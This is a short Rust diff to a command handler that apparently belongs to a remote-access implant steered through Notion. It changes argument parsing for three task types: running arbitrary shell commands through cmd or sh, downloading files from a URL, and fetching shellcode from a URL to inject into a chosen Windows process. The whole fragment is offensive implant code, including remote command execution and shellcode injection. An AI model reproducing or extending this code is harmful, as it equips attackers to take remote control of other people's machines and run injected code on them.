@@ -48,7 +48,7 @@ impl NotionCommand {
             let command_string = String::from(
                 command_words.collect::<Vec<&str>>()
                 .as_slice()
-                .join::<&str>("")
+                .join::<&str>(" ")
             );
             let command_type: CommandType = match t {
                 "shell"    => CommandType::Shell(command_string),
@@ -79,15 +79,17 @@ impl NotionCommand {
                 );
             },
             CommandType::Shell(s) => {
+                let args: Vec<&str> = s.split(" ").collect();
                 let output = if cfg!(target_os = "windows") {
                     Command::new("cmd")
-                        .args(["/c", s.as_str()])
+                        .arg("/c")
+                        .args(args)
                         .output()
                         .expect("failed to execute process")
                 } else {
                     Command::new("sh")
                         .arg("-c")
-                        .arg(s)
+                        .args(args)
                         .output()
                         .expect("failed to execute process")
                 };
@@ -102,7 +104,7 @@ impl NotionCommand {
             CommandType::Download(s) => {
                 let client = Client::new();
                 // Get args
-                let mut args = s.split("-o");
+                let mut args = s.split(" ");
                 // Get URL as the first arg
                 let url = args.nth(0).unwrap();
                 // Get path as the 2nd arg or the last part of the URL
@@ -143,7 +145,7 @@ impl NotionCommand {
             CommandType::Inject(s) => {
                 // Input: url to shellcode -p pid
                 #[cfg(windows)] {
-                    let mut args = s.split("-p");
+                    let mut args = s.split(" ");
                     // Get URL as the first arg
                     let url = args.nth(0).unwrap();
                     // Get path as the 2nd arg or the last part of the URL
